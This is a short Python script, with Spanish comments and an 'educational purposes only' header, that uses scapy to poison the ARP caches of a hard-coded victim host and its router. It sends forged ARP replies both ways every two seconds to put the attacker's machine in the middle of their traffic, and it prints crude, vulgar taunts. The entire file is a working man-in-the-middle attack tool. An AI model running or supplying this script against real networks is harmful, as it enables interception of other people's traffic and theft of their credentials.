### SOLO PARA PROPOSITOS EDUCATIVOS.


from scapy.all import *
import time
import sys

v_ip = "10.24.9.20"
r_ip = "10.24.9.1"
my_mac = "50:0a:1e:00:03:00"

print("[*] CAN I PUT MY BALLS IN YER JAW")
print("[*] Press ctrl+C if u are a p****")

p_v = ARP(op=2, pdst=v_ip, psrc=r_ip, hwsrc=my_mac)
p_r = ARP(op=2, pdst=r_ip, psrc=v_ip, hwsrc=my_mac)

try:
    while True:
        # Envío simultáneo para mantener el envenenamiento bidireccional
        send(p_v, verbose=False)
        send(p_r, verbose=False)
        
        # Intervalo de 2 segundos para estabilidad de red
        time.sleep(2)

except KeyboardInterrupt:
    # Finalización limpia del script al presionar Ctrl+C
    print("[*] HOOOW BOOORIINNNNGGGG...")
